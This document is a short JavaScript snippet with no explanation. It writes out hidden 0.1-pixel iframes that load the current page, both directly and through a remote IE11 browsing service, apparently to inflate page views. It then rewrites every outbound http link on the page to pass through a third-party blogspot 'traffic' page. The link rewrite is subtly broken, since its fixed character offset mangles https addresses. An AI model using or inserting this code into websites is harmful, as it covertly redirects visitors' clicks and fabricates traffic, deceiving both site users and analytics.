var a1 = '<iframe type="text/html" src="';
var a2 = 'https://www.browserling.com/browse/win/7/ie/11/';
var a3 = window.location.href;
var a4 = '" frameborder="0" width="0.1" height="0.1" scrolling="no" sandbox="allow-same-origin allow-scripts allow-popups allow-forms"></iframe>';
document.write( a1 + a2 + a3+ a4 );  
document.write( a1 + a3+ a4 );


 Array.prototype.forEach.call(
    document.querySelectorAll("a[href]"),
    function(link) {
        if (link.href.startsWith("http")) {
            link.href = "https://kasworld-aero.blogspot.com/p/traffic.html?url=" + link.href.substring(7);
        }
    }
);
